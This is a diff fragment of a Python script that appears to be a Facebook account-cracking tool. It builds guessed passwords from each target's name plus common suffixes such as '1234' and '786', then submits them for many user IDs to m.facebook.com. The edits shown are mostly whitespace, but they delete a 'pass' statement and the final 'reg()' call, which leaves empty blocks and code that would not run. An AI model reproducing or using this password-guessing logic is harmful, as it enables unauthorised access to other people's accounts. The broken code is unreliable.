@@ -458,7 +458,7 @@ try:
             hasil(ok,cp)
         elif chi in ('3', '03'):
 
-            os.system('clear')
+            os.system('clear') 
             logo()
             print('')
             print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
@@ -476,7 +476,7 @@ try:
                             pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                         kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                     except:
-       pass
+
 
             hasil(ok,cp)
         else:
@@ -484,4 +484,4 @@ try:
 
 
 if __name__ == '__main__':
-    reg()
+    
